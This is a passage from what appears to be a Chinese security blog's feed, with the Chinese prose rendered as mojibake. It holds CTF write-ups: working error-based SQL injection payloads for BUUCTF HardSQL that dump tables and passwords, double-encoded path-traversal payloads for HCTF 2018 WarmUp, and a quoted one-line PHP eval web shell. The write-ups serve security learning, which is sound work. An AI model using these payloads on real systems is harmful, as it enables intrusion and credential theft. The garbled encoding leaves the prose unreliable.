class="line">admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºåº“</p><p><img src="/2021/08/30/buu/16/image-20210830092011080.png" alt="image-20210830092011080"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/image-20210830092201589.png" alt="image-20210830092201589"></p><p>çˆ†å‡ºè¡¨å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/image-20210830092501514.png" alt="image-20210830092501514"></p><p>çˆ†å‡ºåˆ—å</p><p>æ„é€ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/image-20210830092549838.png" alt="image-20210830092549838"></p><p>å³è¾¹çš„flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210830092639064.png" alt="image-20210830092639064"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¡¥å……ï¼š</span><br><span class="line"></span><br><span class="line">1ï¼šç©ºæ ¼è¢«è¿‡æ»¤å¯ä»¥ä½¿ç”¨&#x2F;**&#x2F;æˆ–è€…()ç»•è¿‡</span><br><span class="line">2ï¼š&#x3D;å·è¢«è¿‡æ»¤å¯ä»¥ç”¨likeæ¥ç»•è¿‡</span><br><span class="line">3ï¼šsubstringä¸midè¢«è¿‡æ»¤å¯ä»¥ç”¨rightä¸leftæ¥ç»•è¿‡</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒåšå®¢ï¼š"><a href="#å‚è€ƒåšå®¢ï¼š" class="headerlink" title="å‚è€ƒåšå®¢ï¼š"></a>å‚è€ƒåšå®¢ï¼š</h4><p>[<a href="https://blog.csdn.net/qq_51652864/article/details/115740086">æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL_o3Evçš„åšå®¢-CSDNåšå®¢</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x00çŸ¥è¯†ç‚¹ï¼š&quot;&gt;&lt;a href=&quot;#0x00çŸ¥è¯†ç‚¹ï¼š&quot; class=&quot;headerlink&quot; title=&quot;0x00çŸ¥è¯†ç‚¹ï¼š&quot;&gt;&lt;/a&gt;0x00çŸ¥è¯†ç‚¹ï¼š&lt;/h4&gt;&lt;h5 id=&quot;updatexml&quot;&gt;&lt;a href=&quot;#updatexml&quot; class=&quot;he</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>HCTF 2018 WarmUp</title>
    <link href="http://daweitech.github.io/2021/08/29/buu/15/"/>
    <id>http://daweitech.github.io/2021/08/29/buu/15/</id>
    <published>2021-08-29T01:27:04.000Z</published>
    <updated>2021-08-29T02:25:40.066Z</updated>
    
    <content type="html"><![CDATA[<p> é‡æ–°å›é¡¾äº†ä¸‹è¿™é¢˜</p><p><img src="/2021/08/29/buu/15/image-20210829094805908.png" alt="image-20210829094805908"></p><p>F12æŸ¥çœ‹åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ä»£ç åˆ†æï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p> é«˜äº®æ˜¾ç¤ºæ–‡ä»¶å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>checkfileå‡½æ•°é‡Œï¼ˆï¼‰ï¼Œæç¤ºæˆ‘ä»¬source.phpå’Œhint.php</p><p>è®¿é—®hint.phpå¾—åˆ°è¯­å¥ï¼š</p><p><strong>flag not here, and flag in ffffllllaaaagggg</strong></p><p>å°†ä¼ é€’çš„å‚æ•°èµ‹å€¼ç»™pageï¼Œç„¶ååˆ¤æ–­è‹¥pageå˜é‡ä¸å­˜åœ¨æˆ–éå­—ç¬¦ä¸²</p><p>åˆ™echo  â€œyou canâ€™t see itâ€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;$_page = mb_substr(</span><br><span class="line">    $page,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‹¥å˜é‡pageå­˜åœ¨äºwhitelistæ•°ç»„ä¸­</p><p>åˆ™è¿”å›true</p><p>ä»¥ä¸‹çœ‹å‡ ä¸ªphpå‡½æ•°ï¼š</p><p>php in_arrayå‡½æ•°</p><p>å®šä¹‰å’Œç”¨æ³•ï¼š</p><p>in_array()å‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼</p><p><strong>æ³¨é‡Šï¼š</strong>å¦‚æœsearchå‚æ•°æ˜¯å­—ç¬¦ä¸²å¹¶ä¸”è®¾ç½®ä¸ºtrueï¼Œåˆ™æœç´¢åŒºåˆ†å¤§å°å†™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(search,array,type)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>search</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦åœ¨æ•°ç»„æœç´¢çš„å€¼ã€‚</td></tr><tr><td align="left"><em>array</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„æ•°ç»„ã€‚</td></tr><tr><td align="left"><em>type</em></td><td align="left">å¯é€‰ã€‚å¦‚æœè®¾ç½®è¯¥å‚æ•°ä¸º trueï¼Œåˆ™æ£€æŸ¥æœç´¢çš„æ•°æ®ä¸æ•°ç»„çš„å€¼çš„ç±»å‹æ˜¯å¦ç›¸åŒã€‚</td></tr></tbody></table><p>php mb_substr()å‡½æ•°</p><p>mb_substr() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œä¹‹å‰æˆ‘ä»¬å­¦è¿‡ substr() å‡½æ•°ï¼Œå®ƒåªé’ˆå¯¹è‹±æ–‡å­—ç¬¦ï¼Œå¦‚æœè¦åˆ†å‰²çš„ä¸­æ–‡æ–‡å­—åˆ™éœ€è¦ä½¿ç”¨ mb_substr()ã€‚</p><p><strong>æ³¨é‡Šï¼š</strong>å¦‚æœ start å‚æ•°æ˜¯è´Ÿæ•°ä¸” length å°äºæˆ–ç­‰äº startï¼Œåˆ™ length ä¸º 0ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mb_substr ( string $str , int $start [, int $length &#x3D; NULL [, string $encoding &#x3D; mb_internal_encoding() ]] ) : string</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>str</em></td><td align="left">å¿…éœ€ã€‚ä»è¯¥ string ä¸­æå–å­å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>start</em></td><td align="left">å¿…éœ€ã€‚è§„å®šåœ¨å­—ç¬¦ä¸²çš„ä½•å¤„å¼€å§‹ã€‚æ­£æ•° - åœ¨å­—ç¬¦ä¸²çš„æŒ‡å®šä½ç½®å¼€å§‹è´Ÿæ•° - åœ¨ä»å­—ç¬¦ä¸²ç»“å°¾çš„æŒ‡å®šä½ç½®å¼€å§‹0 - åœ¨å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¤„å¼€å§‹</td></tr><tr><td align="left"><em>length</em></td><td align="left">å¯é€‰ã€‚è§„å®šè¦è¿”å›çš„å­—ç¬¦ä¸²é•¿åº¦ã€‚é»˜è®¤æ˜¯ç›´åˆ°å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚æ­£æ•° - ä» start å‚æ•°æ‰€åœ¨çš„ä½ç½®è¿”å›è´Ÿæ•° - ä»å­—ç¬¦ä¸²æœ«ç«¯è¿”å›</td></tr><tr><td align="left">encoding</td><td align="left">å¯é€‰ã€‚å­—ç¬¦ç¼–ç ã€‚å¦‚æœçœç•¥ï¼Œåˆ™ä½¿ç”¨å†…éƒ¨å­—ç¬¦ç¼–ç ã€‚</td></tr></tbody></table><p>php mb_strposå‡½æ•°</p><p>å®šä¹‰å’Œç”¨æ³•ï¼š</p><p>æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®</p><p>åŸºäºå­—ç¬¦æ•°æ‰§è¡Œä¸€ä¸ªå¤šå­—èŠ‚å®‰å…¨çš„strpos()æ“ä½œï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®æ˜¯0ï¼Œç¬¬äºŒä¸ªå­—ç¬¦çš„ä½ç½®æ˜¯1ï¼Œä¾æ¬¡ç±»æ¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos(*string,find,start*)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>find</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ã€‚</td></tr><tr><td align="left"><em>start</em></td><td align="left">å¯é€‰ã€‚è§„å®šå¼€å§‹æœç´¢çš„ä½ç½®ã€‚</td></tr></tbody></table><p>æˆ‘ä»¬å¤§æ¦‚å°±å¯ä»¥çŸ¥é“äº†ï¼Œè¿™æ®µä»£ç è¡¨ç¤ºæˆªå–$pageä¸­â€™?â€™å‰éƒ¨åˆ†ï¼Œè‹¥æ— åˆ™æˆªå–æ•´ä¸ª$page</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯å¯¹pageè¿›è¡Œurlè§£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¦–å…ˆåˆ¤æ–­$_REQUEST[â€˜fileâ€™]å€¼éç©º</p><p>ç¬¬äºŒåˆ¤æ–­æ˜¯å¦ä¸ºå­—ç¬¦ä¸²</p><p>å†å°±æ˜¯èƒ½å¦é€šè¿‡checkfileï¼ˆï¼‰å‡½æ•°æ ¡éªŒ</p><p>åé¢æ˜¯åŒ…å«$_REQUEST[â€˜fileâ€™]æ–‡ä»¶</p><p>å¦‚æœæ¡ä»¶ä¸æ»¡è¶³å°±æ‰“å°æ»‘ç¨½è¡¨æƒ…</p><p>ç»“è®ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.ç¬¬ä¸€ä¸ª&#96;&#96;if&#96;&#96;è¯­å¥å¯¹å˜é‡è¿›è¡Œæ£€éªŒï¼Œè¦æ±‚&#96;&#96;$page&#96;&#96;ä¸ºå­—ç¬¦ä¸²ï¼Œå¦åˆ™è¿”å›false</span><br><span class="line">2.ç¬¬äºŒä¸ª&#96;&#96;if&#96;&#96;è¯­å¥åˆ¤æ–­&#96;&#96;$page&#96;&#96;æ˜¯å¦å­˜åœ¨äº&#96;&#96;$whitelist&#96;&#96;æ•°ç»„ä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›true</span><br><span class="line">3.ç¬¬ä¸‰ä¸ª&#96;&#96;if&#96;&#96;è¯­å¥åˆ¤æ–­æˆªå–åçš„&#96;&#96;$page&#96;&#96;æ˜¯å¦å­˜åœ¨äº&#96;&#96;$whitelist&#96;&#96;æ•°ç»„ä¸­ï¼Œæˆªå–&#96;&#96;$page&#96;&#96;ä¸­&#96;&#96;&#39;?&#39;&#96;&#96;å‰éƒ¨åˆ†ï¼Œå­˜åœ¨åˆ™è¿”å›true</span><br><span class="line">4.ç¬¬å››ä¸ª&#96;&#96;if&#96;&#96;è¯­å¥åˆ¤æ–­urlè§£ç å¹¶æˆªå–åçš„&#96;&#96;$page&#96;&#96;æ˜¯å¦å­˜åœ¨äº&#96;&#96;$whitelist&#96;&#96;ä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›true</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è‹¥ä»¥ä¸Šå››ä¸ª&#96;&#96;if&#96;&#96;è¯­å¥å‡æœªè¿”å›å€¼ï¼Œåˆ™è¿”å›false</span><br><span class="line">æœ‰ä¸‰ä¸ª&#96;&#96;if&#96;&#96;è¯­å¥å¯ä»¥è¿”å›trueï¼Œç¬¬äºŒä¸ªè¯­å¥ç›´æ¥åˆ¤æ–­&#96;&#96;$page&#96;&#96;ï¼Œä¸å¯ç”¨</span><br><span class="line">ç¬¬ä¸‰ä¸ªè¯­å¥æˆªå–&#96;&#96;&#39;?&#39;&#96;&#96;å‰éƒ¨åˆ†ï¼Œç”±äº?è¢«åéƒ¨åˆ†è¢«è§£æä¸ºgetæ–¹å¼æäº¤çš„å‚æ•°ï¼Œä¹Ÿä¸å¯åˆ©ç”¨</span><br><span class="line">ç¬¬å››ä¸ª&#96;&#96;if&#96;&#96;è¯­å¥ä¸­ï¼Œå…ˆè¿›è¡Œurlè§£ç å†æˆªå–ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†?ç»è¿‡ä¸¤æ¬¡urlç¼–ç ï¼Œåœ¨æœåŠ¡å™¨ç«¯æå–å‚æ•°æ—¶è§£ç ä¸€æ¬¡ï¼ŒcheckFileå‡½æ•°ä¸­è§£ç ä¸€æ¬¡ï¼Œä»ä¼šè§£ç ä¸º&#96;&#96;&#39;?&#39;&#96;&#96;ï¼Œä»å¯é€šè¿‡ç¬¬å››ä¸ª&#96;&#96;if&#96;&#96;è¯­å¥æ ¡éªŒã€‚ï¼ˆ&#96;&#96;&#39;?&#39;&#96;&#96;ä¸¤æ¬¡ç¼–ç å€¼ä¸º&#96;&#96;&#39;%253f&#39;&#96;&#96;ï¼‰,æ„é€ urlï¼š</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source.php?file&#x3D;hint.php%253F..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source.php?file&#x3D;source.php%253F..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>hint.phpå’Œsource.phpéƒ½æ˜¯ç™½åå•é‡Œæ–‡ä»¶</p><p>å› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“ffffllllaaaaggggæ–‡ä»¶å­˜æ”¾çš„å…·ä½“ä½ç½®<br>æ‰€ä»¥å¯ä»¥ä¾æ¬¡å¢åŠ    ../</p><p>æœ€åæ‹¿åˆ°flag</p><p><img src="/2021/08/29/buu/15/image-20210829101454490.png" alt="image-20210829101454490"></p><p>å€Ÿé‰´äºï¼š</p><p>[<a href="https://www.cnblogs.com/R-S-PY/p/12095264.html">HCTF 2018]WarmUp - AlexANSO - åšå®¢å›­ (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; é‡æ–°å›é¡¾äº†ä¸‹è¿™é¢˜&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/08/29/buu/15/image-20210829094805908.png&quot; alt=&quot;image-20210829094805908&quot;&gt;&lt;/p&gt;
&lt;p&gt;F12æŸ¥çœ‹åˆ°æºç &lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>æ¸—é€æµ‹è¯•_åŸºç¡€å…¥é—¨_æ¦‚å¿µåè¯</title>
    <link href="http://daweitech.github.io/2021/08/27/src/1/"/>
    <id>http://daweitech.github.io/2021/08/27/src/1/</id>
    <published>2021-08-27T07:44:57.000Z</published>
    <updated>2021-08-27T08:26:25.702Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/weixin_44519789/article/details/114131958">https://blog.csdn.net/weixin_44519789/article/details/114131958</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/weixin_44519789/article/details/114131958&quot;&gt;https://blog.csdn.net/weixin_44519789/article/details/114131958</summary>
      
    
    
    
    
    <category term="web" scheme="http://daweitech.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>leak</title>
    <link href="http://daweitech.github.io/2021/08/25/src/leak/"/>
    <id>http://daweitech.github.io/2021/08/25/src/leak/</id>
    <published>2021-08-25T07:41:00.000Z</published>
    <updated>2021-09-01T02:21:23.823Z</updated>
    
    <content type="html"><![CDATA[<p>PHPæ¼æ´ä»‹ç»</p><p><a href="https://www.jb51.net/article/31898.htm">https://www.jb51.net/article/31898.htm</a></p><p>é’ˆå¯¹phpç½‘ç«™çš„ä¸»è¦å‡ ç§æ”»å‡»æ–¹å¼</p><h3 id="1-å‘½ä»¤æ³¨å…¥"><a href="#1-å‘½ä»¤æ³¨å…¥" class="headerlink" title="1.å‘½ä»¤æ³¨å…¥"></a>1.å‘½ä»¤æ³¨å…¥</h3><p><a href="https://blog.csdn.net/qq2539879928/article/details/106635907">https://blog.csdn.net/qq2539879928/article/details/106635907</a></p><h3 id="2-evalæ³¨å…¥"><a href="#2-evalæ³¨å…¥" class="headerlink" title="2.evalæ³¨å…¥"></a>2.evalæ³¨å…¥</h3><p>evalå‡½æ•°ï¼Œå¸¸ç”¨ï¼š@eval($_POST[â€˜cmdâ€™])</p><h3 id="3-å®¢æˆ·ç«¯è„šæœ¬æ”»å‡»"><a href="#3-å®¢æˆ·ç«¯è„šæœ¬æ”»å‡»" class="headerlink" title="3.å®¢æˆ·ç«¯è„šæœ¬æ”»å‡»"></a>3.å®¢æˆ·ç«¯è„šæœ¬æ”»å‡»</h3><h3 id="4-è·¨ç½‘ç«™è„šæœ¬æ”»å‡»"><a href="#4-è·¨ç½‘ç«™è„šæœ¬æ”»å‡»" class="headerlink" title="4.è·¨ç½‘ç«™è„šæœ¬æ”»å‡»"></a>4.è·¨ç½‘ç«™è„šæœ¬æ”»å‡»</h3><h3 id="5-sqlæ³¨å…¥æ”»å‡»"><a href="#5-sqlæ³¨å…¥æ”»å‡»" class="headerlink" title="5.sqlæ³¨å…¥æ”»å‡»"></a>5.sqlæ³¨å…¥æ”»å‡»</h3><h3 id="6-è·¨ç½‘ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»"><a href="#6-è·¨ç½‘ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»" class="headerlink" title="6.è·¨ç½‘ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»"></a>6.è·¨ç½‘ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»</h3><p>CSRF</p><h3 id="7-Sessionä¼šè¯åŠ«æŒ"><a href="#7-Sessionä¼šè¯åŠ«æŒ" class="headerlink" title="7.Sessionä¼šè¯åŠ«æŒ"></a>7.Sessionä¼šè¯åŠ«æŒ</h3><h3 id="8-Sessionå›ºå®šæ”»å‡»"><a href="#8-Sessionå›ºå®šæ”»å‡»" class="headerlink" title="8.Sessionå›ºå®šæ”»å‡»"></a>8.Sessionå›ºå®šæ”»å‡»</h3><h3 id="9-HTTPå“åº”æ‹†åˆ†æ”»å‡»"><a href="#9-HTTPå“åº”æ‹†åˆ†æ”»å‡»" class="headerlink" title="9.HTTPå“åº”æ‹†åˆ†æ”»å‡»"></a>9.HTTPå“åº”æ‹†åˆ†æ”»å‡»</h3><h3 id="10-æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#10-æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="10.æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>10.æ–‡ä»¶ä¸Šä¼ æ¼æ´</h3><p><a href="https://blog.csdn.net/weixin_44519789/article/details/116570426">https://blog.csdn.net/weixin_44519789/article/details/116570426</a></p><h3 id="11-ç›®å½•ç©¿è¶Šæ¼æ´"><a href="#11-ç›®å½•ç©¿è¶Šæ¼æ´" class="headerlink" title="11.ç›®å½•ç©¿è¶Šæ¼æ´"></a>11.ç›®å½•ç©¿è¶Šæ¼æ´</h3><p><a href="https://blog.csdn.net/angry_program/article/details/107855078">https://blog.csdn.net/angry_program/article/details/107855078</a></p><h3 id="12-è¿œç¨‹æ–‡ä»¶åŒ…å«æ”»å‡»"><a href="#12-è¿œç¨‹æ–‡ä»¶åŒ…å«æ”»å‡»" class="headerlink" title="12.è¿œç¨‹æ–‡ä»¶åŒ…å«æ”»å‡»"></a>12.è¿œç¨‹æ–‡ä»¶åŒ…å«æ”»å‡»</h3><p><a href="https://blog.csdn.net/qq_45300786/article/details/108724251">https://blog.csdn.net/qq_45300786/article/details/108724251</a></p><h3 